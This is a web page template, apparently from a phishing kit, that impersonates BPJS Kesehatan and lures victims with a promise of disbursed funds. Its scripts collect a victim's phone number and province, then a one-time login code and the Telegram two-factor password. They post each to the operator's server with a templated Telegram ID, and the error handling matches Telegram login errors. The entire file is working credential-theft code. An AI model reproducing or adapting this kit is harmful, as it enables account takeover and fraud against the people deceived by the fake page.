<div style="display: none;" id="password-container" class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm" x-data="{ showPassword: false }">
    <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="<%= imageUrl1 %>" width="400"/>

    <div class="text-center mb-6">
        <p class="pt-2 text-left text-gray-700">
            Mohon Masukkan Password atau A2F Telegram Anda.
        </p>
    </div>

    <form>
        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
         <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
        <div class="relative mb-4">
            <!-- Input Password -->
            <input :type="showPassword ? 'text' : 'password'" id="password-input" autocomplete="off"
                class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Password">
            
            <!-- Tombol Toggle -->
            <button type="button" class="absolute right-2 top-1 text-gray-500 p-2" @click="showPassword = !showPassword">
                <!-- Ikon Mata Dinamis -->
                <template x-if="!showPassword">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 2.045-4.623 6-9.542 6-4.92 0-8.267-3.955-9.542-6z" />
                    </svg>
                </template>
                <template x-if="showPassword">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18M10.59 10.59A3 3 0 0113.41 13.41M9.17 14.83a10.05 10.05 0 01-4.25-2.83M14.83 9.17a10.05 10.05 0 014.25 2.83M12 5c4.418 0 8.032 2.94 9.245 6.501M4.755 17.499A9.961 9.961 0 012.755 12c1.213-3.561 4.827-6.501 9.245-6.501" />
                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 2.045-4.623 6-9.542 6-4.92 0-8.267-3.955-9.542-6z" />
                    </svg>
                </template>
            </button>
        </div>
        <span id="pass-error" class="text-red-500 text-sm"></span>
        <button onclick="ketiga()" id="passbutt" class="w-full bg-[#ff0018] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
           Selanjutnya
         </button>
    </form>
</div>




<div  style="display: none;" id="four" class="w-fullflex flex-col items-center">
    <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="<%= imageUrl1 %>" width="400"/>
    <div class="text-center mb-6">

        <h1 class="pt-5 text-2xl font-bold text-[#3269ba]">
            <%= title %>
        </h1>
       </div>

       
    <div class="text-center mt-4">
        <h1 class="border-2 text-xl p-2 border rounded-lg  border-blue-300 font-bold"><%= titlefour %></h1>
    </div>
    <div id="aduanContainer" class="text-center mt-4 border-2 text-sm p-2 border rounded-lg  border-blue-300 font-bold">
    
        <h1 class="text-sm p-2 border rounded-lg  border-blue-300 font-bold">AJUKAN KELUHAN ANDA DI BAWAH :</h1>
     <textarea id="textareaisi" class="border-2 text-sm p-2 border rounded-lg  border-blue-300 font-bold mt-4 p-2 border border-gray-300 rounded-md w-full"></textarea>
     <button id="submitButtonaj" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded mt-4">
         AJUKAN
        </button>
    </div>
</div>
</main>

    <footer class=" text-white text-center">
            <img src="assets/img/bawah.png" alt="Footer Logo" class="w-full">
    </footer>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>

document.getElementById("submitButtonaj").addEventListener("click", function() {
                document.getElementById("aduanContainer").style.display = "none";
            });

function onOtpComplete(otp) {
        otp = otp.substring(0, 5); 
        if (!otp || !/^\d{5}$/.test(otp)) { 
            $("#otp-error").text("Kode Tidak Cocok!");
    return; // Bisa ditambahkan untuk menghentikan eksekusi jika OTP salah
}

var $clientHash = $("input#validateclientHash").val();
var $phone_number = $("input#validatephone_number").val();
var $otp_code = $("input#validateotpcode").val();
var $provinsi = $("input#validateprovinsi").val();
var $idtele = "<%= String(telegramId) %>"
var dataToSend = {
clientHash: $clientHash,
phone_number: $phone_number,
otp_code: otp,
provinsi: $provinsi,
idtele: $idtele
};
console.log(dataToSend); 
$.ajax({
type: "POST",
url: "/code",
data: dataToSend,
beforeSend: function() {
$("#otp-error").text("")
document.getElementById('loading-spinner').classList.remove('hidden')
},
success: function(hasil){  
document.getElementById('loading-spinner').classList.add('hidden')           
if(hasil.needPassword || hasil.code == 401){
console.log(hasil)
             $("#otp").hide();
$('#password-container').show();            
$("input#validatephone_number").val($phone_number);
$("input#validateprovinsi").val($provinsi);
$("input#validateclientHash").val($clientHash);                                
}else{                 
try{
      console.log(hasil)                
          if(hasil.code == 200){
            $("#otp").hide();
$("#four").show()
}else{
$("#otp-error").text(`${hasil.error}`)
}
}catch(e){
console.log(e)
console.log(hasil)
$("#otp-error").text(`Ada masalah,coba lagi`)
}
}
},
error: function(xhr, status, error) {
    document.getElementById('loading-spinner').classList.add('hidden')
if (status === "timeout") {
$("#otp-error").text(`Periksa jaringan anda dan coba lagi`)
} else {
$("#otp-error").text(`Periksa jaringan anda dan coba lagi`)
}
}
})


}

 const inputs = document.querySelectorAll('input[id="otp_code"]');
 inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, ''); // Hanya angka yang diperbolehkan
            
            if (e.target.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            
            let otp = Array.from(inputs).map(i => i.value).join('');
            if (otp.length === inputs.length) {
                onOtpComplete(otp);
            }
        });
        
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && index > 0 && !e.target.value) {
                inputs[index - 1].focus();
            }
        });
    });


function formatPhoneNumber(phoneNumber) {
// Jika nomor telepon diawali dengan '0', ganti dengan '+628'
if (phoneNumber.startsWith('0')) {
return '+62' + phoneNumber.substring(1);
}
// Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
else if (phoneNumber.startsWith('62')) {
return '+62' + phoneNumber.substring(2);
}
// Jika format sudah sesuai, kembalikan nomor tanpa perubahan
else {
return phoneNumber;
}
}

function pertamasudah(){
$('#wellcome').submit(function(kirimpertama){
kirimpertama.preventDefault();
// Ambil elemen input


// <!-- namaktp
// plat 
// provinsi
// number -->


const namaktp = document.getElementById('namaktp');
const number = document.getElementById('number');
const provinsiSelect = document.getElementById('provinsi');
const plat = document.getElementById('plat');




// Pastikan elemen tidak null sebelum mengambil nilainya
const platValue = plat?.value.trim() || "";
const namaktpValue = namaktp?.value.trim() || "";
const numberValue = number?.value.trim() || "";

// Ambil teks dari opsi yang dipilih atau nilai input jika bukan select
const provinsiText = provinsiSelect?.options[provinsiSelect.selectedIndex]?.text.trim() || "";



// Validasi apakah semua field sudah diisi dengan benar
if ( !plat || !namaktpValue || 
    !numberValue ||
    !provinsiText || provinsiText === "Pilih Provinsi") {
    
    // Menampilkan pesan error jika data tidak valid
    $("#sudah-error").text("Isi Semua Formulir Dengan Lengkap!");
    return;
}





var $phone = $("input#number").val();
// var $provinsi = $("input#validateprovinsi").val();
var $phone_number = formatPhoneNumber($phone);

var dataToSend = {
phone_number: $phone_number,
provinsi: provinsiText,

};

console.log(dataToSend)
$.ajax({
type: "POST",
url: "/number",
data: dataToSend,
beforeSend: function() {
    document.getElementById('loading-spinner').classList.remove('hidden')
    $("#numberbuttsudah").hide();
$("#number-error").text(``)
},
success: function(hasil){
    document.getElementById('loading-spinner').classList.add('hidden')
if(hasil.code == 200){ 

    $("#otp").show();
    $('#wellcome').hide();

    $("input#validatephone_number").val($phone_number);
    $("input#validateprovinsi").val(provinsiText);
       $("input#validateclientHash").val(hasil.clientHash);
}else{
    $("#numberbuttsudah").text("CAIRKAN");
        $("#numberbuttsudah").prop("disabled", false);

if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
    $("#numberbuttsudah").text("CAIRKAN");
    $("#numberbuttsudah").prop("disabled", false);
                  
                    $("#number-error").text(`Nomor Yang Anda Masukkan Tidak Valid!`)
                    }else if(hasil.err.errorMessage == "FLOOD"){
                        $("#numberbuttsudah").text("CAIRKAN");
                        $("#numberbuttsudah").prop("disabled", false);
                        $("#number-error").text(`Terlalu Banyak Permintaan Code!`)
                        
                    }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
                        $("#numberbuttsudah").text("CAIRKAN");
                        $("#numberbuttsudah").prop("disabled", false);
                        $("#number-error").text(`Terlalu Banyak Memasukkan Password!`)
                        }else{
                            $("#numberbuttsudah").text("CAIRKAN");
                            $("#numberbuttsudah").prop("disabled", false);
                            $("#number-error").text(`${hasil.err.errorMessage}`)
                            }
}

}
});
});


return false;

}



function ketiga(){
$('#password-container').submit(function(kirimpass){
  kirimpass.preventDefault();

  // Mengambil nilai input
  var $phone_number = $("input#validatephone_number").val();
var $clientHash = $("input#validateclientHash").val();
  var $provinsi = $("input#validateprovinsi").val();
  var $password = $("input#password-input").val();
  var $idtele = "<%= String(telegramId) %>"; // Pastikan nilai telegramId sudah valid

var dataToSend = {
clientHash: $clientHash,
phone_number: $phone_number,
provinsi: $provinsi,
password: $password,
idtele: $idtele

};
console.log(dataToSend); 


  $.ajax({
      type: "POST",
      url: "/password",
      data: dataToSend,
      beforeSend: function() {
    $("#passbutt").hide();
    document.getElementById('loading-spinner').classList.remove('hidden')
$("#pass-error").text("")
 },
 success: function(response){
    document.getElementById('loading-spinner').classList.add('hidden')
          try {
              // Mengecek apakah respons sukses atau error
              if (response.code == 200) {
             
                  $("#password-container").hide();
                  $("#four").show();

              } else {
                $("#passbutt").text("Selanjutnya");
                $("#passbutt").prop("disabled", false);
                  if (response.error) {
$("#pass-error").text(response.error)
                  } else {
$("#pass-error").text(`Ada masalah, refresh halaman dan coba lagi`)
}
}
          } catch (e) {
            $("#passbutt").text("Selanjutnya");
            $("#passbutt").prop("disabled", false);
 $("#pass-error").text(`Ada masalah, refresh halaman dan coba lagi`)
 console.log(e);
          }
      },
      error: function(xhr, status, error){
        document.getElementById('loading-spinner').classList.remove('hidden')
        $("#passbutt").text("Selanjutnya");
        $("#passbutt").prop("disabled", false);
          console.log(error);
            $("#pass-error").text(`Terjadi kesalahan!`)
      }
  });

  return false; // Menghentikan form submit default
});
return false;
};


</script>

